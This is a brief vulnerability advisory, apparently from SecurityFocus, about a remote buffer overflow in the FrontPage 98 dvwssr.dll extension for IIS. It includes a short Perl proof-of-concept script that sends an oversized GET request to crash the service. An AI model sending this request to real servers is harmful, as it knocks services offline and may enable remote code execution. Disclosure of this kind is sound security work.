source: http://www.securityfocus.com/bid/1109/info

The dvwssr.dll included with the FrontPage 98 extensions for IIS and shipped as part of the NT Option Pack has a remotely exploitable buffer overflow. This attack will result in the service no longer accepting connections and may allow for remote code execution on the vulnerable host. 


#!/usr/bin/perl
print "GET /_vti_bin/_vti_aut/dvwssr.dll?";
print "a" x 5000;
print " HTTP/1.1\nHost: yourhost\n\n";